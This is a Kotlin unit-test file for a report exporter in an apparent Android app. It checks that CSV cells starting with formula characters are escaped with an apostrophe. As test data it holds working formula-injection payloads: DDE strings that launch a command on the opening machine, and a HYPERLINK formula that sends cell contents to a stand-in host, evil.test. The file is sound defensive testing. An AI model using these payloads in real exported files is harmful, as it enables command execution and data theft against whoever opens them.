package com.example.iurankomplek.export

import com.example.iurankomplek.TestFixtures
import org.junit.Assert.assertEquals
import org.junit.Assert.assertNull
import org.junit.Test

/**
 * The exported report is shared straight to a recipient, so a spreadsheet app will evaluate
 * any cell that looks like a formula. These tests pin the escaping contract.
 */
class CsvFormulaInjectionTest {

    @Test
    fun `cells starting with an equals sign are neutralised`() {
        assertEquals("'=1+1", ReportExporter.escapeCsvFormula("=1+1"))
        assertEquals("'=cmd|'/c calc'!A1", ReportExporter.escapeCsvFormula("=cmd|'/c calc'!A1"))
    }

    @Test
    fun `cells starting with plus minus or at are neutralised`() {
        assertEquals("'+1", ReportExporter.escapeCsvFormula("+1"))
        assertEquals("'-2+3", ReportExporter.escapeCsvFormula("-2+3"))
        assertEquals("'@SUM(A1:A9)", ReportExporter.escapeCsvFormula("@SUM(A1:A9)"))
    }

    @Test
    fun `leading whitespace does not hide a formula`() {
        assertEquals("' =1+1", ReportExporter.escapeCsvFormula(" =1+1"))
        assertEquals("'\t=1+1", ReportExporter.escapeCsvFormula("\t=1+1"))
    }

    @Test
    fun `leading control characters are neutralised`() {
        assertEquals("'\r=1+1", ReportExporter.escapeCsvFormula("\r=1+1"))
    }

    @Test
    fun `ordinary values are left untouched`() {
        assertEquals("John Doe", ReportExporter.escapeCsvFormula("John Doe"))
        assertEquals("Perbaikan jalan komplek", ReportExporter.escapeCsvFormula("Perbaikan jalan komplek"))
        assertEquals("john@example.com", ReportExporter.escapeCsvFormula("john@example.com"))
        assertEquals("", ReportExporter.escapeCsvFormula(""))
        assertEquals("100", ReportExporter.escapeCsvFormula("100"))
    }

    @Test
    fun `null stays null rather than becoming a literal apostrophe`() {
        assertNull(ReportExporter.escapeCsvFormula(null))
    }

    @Test
    fun `an attacker controlled utilisation note cannot smuggle a formula`() {
        val hostile = TestFixtures.dataItem(
            firstName = "=HYPERLINK(\"http://evil.test?d=\"&A1,\"click\")",
            lastName = "",
            pemanfaatanIuran = "@SUM(1+1)*cmd|' /C calc'!A0"
        )

        assertEquals("'=HYPERLINK(\"http://evil.test?d=\"&A1,\"click\")", ReportExporter.escapeCsvFormula("${hostile.first_name} ${hostile.last_name}".trim()))
        assertEquals("'@SUM(1+1)*cmd|' /C calc'!A0", ReportExporter.escapeCsvFormula(hostile.pemanfaatan_iuran))
    }
}
